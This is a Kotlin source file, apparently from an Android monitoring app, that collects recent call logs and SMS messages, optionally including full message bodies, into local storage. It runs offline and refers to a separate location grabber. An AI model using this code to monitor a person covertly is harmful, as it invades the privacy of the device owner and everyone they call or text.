package com.guardian.client

import android.content.Context
import android.content.pm.PackageManager
import android.provider.CallLog
import android.provider.Telephony

/**
 * Pulls call log and SMS into the Store. Runs with no network needed, so data
 * keeps accumulating offline. Location is handled by LocationGrab.
 *
 * We re-scan a trailing window each run; the Store's UNIQUE constraints discard
 * anything already saved, so there are no duplicates.
 */
object Collectors {

    private const val LOOKBACK_MS = 48L * 60 * 60 * 1000  // rescan last 48h

    fun collectAll(ctx: Context) {
        val store = Store(ctx)
        val since = System.currentTimeMillis() - LOOKBACK_MS
        runCatching { collectCalls(ctx, store, since) }
        runCatching { collectSms(ctx, store, since) }
    }

    private fun collectCalls(ctx: Context, store: Store, since: Long) {
        val cur = ctx.contentResolver.query(
            CallLog.Calls.CONTENT_URI, null,
            "${CallLog.Calls.DATE} > ?", arrayOf(since.toString()), null
        ) ?: return
        cur.use {
            val iNum = it.getColumnIndex(CallLog.Calls.NUMBER)
            val iName = it.getColumnIndex(CallLog.Calls.CACHED_NAME)
            val iType = it.getColumnIndex(CallLog.Calls.TYPE)
            val iDate = it.getColumnIndex(CallLog.Calls.DATE)
            val iDur = it.getColumnIndex(CallLog.Calls.DURATION)
            while (it.moveToNext()) {
                val type = when (it.getInt(iType)) {
                    CallLog.Calls.INCOMING_TYPE -> "incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                    CallLog.Calls.MISSED_TYPE -> "missed"
                    CallLog.Calls.REJECTED_TYPE -> "rejected"
                    else -> "other"
                }
                store.addCall(
                    it.getLong(iDate), it.getString(iNum),
                    if (iName >= 0) it.getString(iName) else null,
                    type, it.getLong(iDur)
                )
            }
        }
    }

    private fun collectSms(ctx: Context, store: Store, since: Long) {
        val sendBody = Config(ctx).sendSmsBody
        val cur = ctx.contentResolver.query(
            Telephony.Sms.CONTENT_URI, null,
            "${Telephony.Sms.DATE} > ?", arrayOf(since.toString()), null
        ) ?: return
        cur.use {
            val iAddr = it.getColumnIndex(Telephony.Sms.ADDRESS)
            val iDate = it.getColumnIndex(Telephony.Sms.DATE)
            val iType = it.getColumnIndex(Telephony.Sms.TYPE)
            val iBody = it.getColumnIndex(Telephony.Sms.BODY)
            while (it.moveToNext()) {
                val body = it.getString(iBody) ?: ""
                val dir = if (it.getInt(iType) == Telephony.Sms.MESSAGE_TYPE_INBOX) "in" else "out"
                store.addSms(it.getLong(iDate), it.getString(iAddr), dir,
                    if (sendBody) body else "[${body.length} chars]")
            }
        }
    }
}
